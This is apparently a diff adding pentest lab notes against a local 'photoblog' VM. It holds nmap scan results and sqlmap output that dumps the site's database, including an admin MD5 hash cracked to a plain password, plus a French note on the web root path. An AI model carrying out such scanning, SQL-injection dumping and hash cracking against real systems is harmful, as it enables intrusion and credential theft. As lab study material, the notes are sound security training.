@@ -1,0 +1,83 @@
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.16 ((Debian))
+|_http-server-header: Apache/2.2.16 (Debian)
+| http-enum:
+|   /admin/login.php: Possible admin folder
+|   /classes/: Potentially interesting directory w/ listing on 'apache/2.2.16 (debian)'
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.16 (debian)'
+|   /icons/: Potentially interesting folder w/ directory listing
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.16 (debian)'
+|   /index/: Potentially interesting folder
+|_  /show/: Potentially interesting folder
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+# SQL MAP
+[08:53:14] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] photoblog
+
+
+
+Database: photoblog
+Table: pictures
+[3 entries]
++----+-----+-------------+---------+
+| id | cat | img         | title   |
++----+-----+-------------+---------+
+| 1  | 2   | hacker.png  | Hacker  |
+| 2  | 1   | ruby.jpg    | Ruby    |
+| 3  | 1   | cthulhu.png | Cthulhu |
++----+-----+-------------+---------+
+
+[08:56:15] [INFO] table 'photoblog.pictures' dumped to CSV file '/home/noenic/.local/share/sqlmap/output/192.168.228.132/dump/photoblog/pictures.csv'
+[08:56:15] [INFO] fetching columns for table 'users' in database 'photoblog'
+[08:56:15] [INFO] fetching entries for table 'users' in database 'photoblog'
+[08:56:15] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[08:56:24] [INFO] writing hashes to a temporary file '/tmp/sqlmap_8xm6w1c43/sqlmaphashes-pom51lzq.txt'
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[08:56:32] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+>
+
+[08:57:04] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] y
+[08:57:08] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[08:57:08] [INFO] starting 8 processes
+[08:57:08] [INFO] cracked password 'P4ssw0rd' for user 'admin'
+Database: photoblog
+Table: users
+[1 entry]
++----+-------+---------------------------------------------+
+| id | login | password                                    |
++----+-------+---------------------------------------------+
+| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
++----+-------+---------------------------------------------+
+
+[08:57:12] [INFO] table 'photoblog.users' dumped to CSV file '/home/noenic/.local/share/sqlmap/output/192.168.228.132/dump/photoblog/users.csv'
+[08:57:12] [INFO] fetching columns for table 'categories' in database 'photoblog'
+[08:57:12] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[08:57:12] [INFO] fetching entries for table 'categories' in database 'photoblog'
+Database: photoblog
+Table: categories
+[3 entries]
++----+--------+
+| id | title  |
++----+--------+
+| 1  | test   |
+| 2  | ruxcon |
+| 3  | 2010   |
++----+--------+
+
+
+
+
+# On sait grace a error-on-upload que le chemin est /var/www/
